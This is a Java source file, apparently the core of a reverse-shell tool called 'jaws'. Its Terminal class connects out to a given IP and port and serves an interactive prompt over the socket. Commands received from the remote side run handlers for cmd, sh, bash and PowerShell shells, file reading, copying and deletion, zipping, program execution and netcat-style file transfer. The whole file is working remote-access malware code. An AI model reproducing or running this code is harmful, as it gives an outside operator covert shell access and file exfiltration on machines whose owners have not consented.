package terminal;
//this class builds the terminal and sends the input to the interpreter
//imports
import java.util.Scanner;
import commands.shells.CmdCommand;
import java.util.HashMap;
import java.lang.reflect.Method;
import java.lang.reflect.InvocationTargetException;
import java.util.Set;
import java.io.File;
import java.io.PrintWriter;
import java.io.ByteArrayInputStream;
import remote.*;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;

public class Terminal {
	//declare variables
	//Interpreter preter = new Interpreter();
	public static HashMap<String, String> commands = new HashMap<>();
	public static ArrayList<String> sortedCommands;
	public static Helper help = new Helper();
	public static String prompt;
	public static String os;
	public static boolean pauseShell;
	public static String ip;
	public static int port;
	//constructor
	//default
	public Terminal(){
	}
	//with provided ip and port
	public Terminal(String inIp, int inPort){
		//assign ip and port
		ip = inIp;
		port = inPort;
	}

	//methods
	//initialize commands
	public static void initCommands(){
		//initialize command classes
		//add any commands here
		commands.put("help", "commands.misc.HelpCommand");
		commands.put("pwd", "commands.filesystem.PwdCommand");
		commands.put("ls", "commands.filesystem.LsCommand");
		commands.put("cd", "commands.filesystem.CdCommand");
		commands.put("cmd", "commands.shells.CmdCommand");
		commands.put("sh", "commands.shells.ShCommand");
		commands.put("bash", "commands.shells.BashCommand");
		commands.put("pwsh", "commands.shells.PwshCommand");
		commands.put("cat", "commands.filesystem.CatCommand");
		commands.put("touch", "commands.filesystem.TouchCommand");
		commands.put("tonc", "commands.filesystem.ToNCCommand");
		commands.put("ncto", "commands.filesystem.NcToCommand");
		commands.put("vim", "commands.misc.VimCommand");
		commands.put("cp", "commands.filesystem.CopyCommand");
		commands.put("mv", "commands.filesystem.MoveCommand");
		commands.put("rm", "commands.filesystem.RemoveCommand");
		commands.put("mkdir", "commands.filesystem.MkdirsCommand");
		commands.put("find", "commands.filesystem.FindCommand");
		commands.put("run", "commands.exec.RunCommand");
		commands.put("zip", "commands.filesystem.ZipCommand");
		commands.put("unzip", "commands.filesystem.UnZipCommand");
		sortedCommands = new ArrayList<String>(commands.keySet());
		Collections.sort(sortedCommands);
	}

	//update prompt
	public static void updatePrompt(){
		//getcurrentpwd
		File curPwdPrompt = help.getCurPwd();

		prompt = "|-(" + help.getUserName() + "@" + help.getHostName() + ")-[" + curPwdPrompt + "]\n|-jaws> ";
	}//end of updatePrompt method

	//getCommands set
	public Set<String> getCommands() {
		//return the keys of all the commands
		return commands.keySet();
	}//end of getCommands method

	//getSortedCommands
	public ArrayList<String> getSortedCommands() {
		//return the keys of all the commands
		return sortedCommands;
	}//end of getSortedCommands method
	
	public HashMap<String, String> getCommandsAndPaths(){
		//return the hashmap with commands and paths
		return commands;
	}
	public static void startShell() throws InstantiationException, IllegalAccessException, NoSuchMethodException, SecurityException, IllegalArgumentException, InvocationTargetException {
		//do stuff
		//setup connection
		Connection con = new Connection(ip,port);
		con.connectOut();

		//check what operating system
		//System.out.println(System.getProperty("os.name"));
		os = System.getProperty("os.name");

		//update prompt
		updatePrompt();

		//setup reused variables
		String input = new String();

		//call the class loader
		JavaClassLoader jcl = new JavaClassLoader();

		//write the prompt
		con.writeDis(prompt);

		//get input stream (to read from)
		input = con.readDisln();

		//if you use the equals method on a null value it throws the nullpointerexception
		//while (!(input.equals("exit")) /*&& !(con.closed())*/) {
		while (input != null && !(input.equals("exit"))) {
			//within the shell after first display
			//check the length of the input
			if (input.length() == 0) {
				//no command was provided
				//call help
				jcl.invokeClassMethod(commands.get("help"), "execute", con, "no command provided");
			} else {
				//split the input
				String[] splitLine = input.split("\\s+", 2);

				//check if the command exists in the hashmap
				if (commands.containsKey(splitLine[0])) {
					//check how big the splitline array is
					if (splitLine.length > 1) {
						//command has arguments
						jcl.invokeClassMethod(commands.get(splitLine[0]), "execute", con, splitLine[0], splitLine[1]);
					} else if (splitLine.length == 1) {
						//command doesn't have any arguments
						jcl.invokeClassMethod(commands.get(splitLine[0]), "execute", con, splitLine[0]);
					}
				} else { 
					//command doesn't exist
					jcl.invokeClassMethod(commands.get("help"), "execute", con, "command does not exist");
				}
			}
			//then display the prompt again
			con.writeDis(prompt);
			//block for more input
			input = con.readDisln();
		}//end of while
		//exit the program if pauseShell is true
		if (input != null){
			//send output through socket
			System.out.println("exiting...");
		}
		System.exit(0);
	}//end of startShell method

	//stop shell method
	public static void pauseShell(){
		pauseShell = false;
		Scanner s = new Scanner(System.in);
		String in = new String();
		do {
			//get the next line
			in = s.nextLine();

			//send the line to the other thread
			CmdCommand.setLine(in);

			//set variable to true
			CmdCommand.setHasInput(true);
		} while (!in.equals("exit"));
		s = null;
		//System.setIn(new ByteArrayInputStream("\n".getBytes()));
	}//end of stopShell method
}//end of Terminal class
